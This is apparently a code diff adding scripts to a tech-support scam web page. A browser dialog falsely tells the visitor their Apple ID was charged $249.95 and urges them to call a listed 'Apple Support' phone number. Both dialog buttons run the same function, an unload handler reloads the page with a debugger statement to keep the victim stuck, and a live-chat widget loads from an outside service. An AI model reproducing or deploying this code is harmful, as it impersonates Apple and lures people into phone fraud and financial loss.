+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-844-959-1904 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
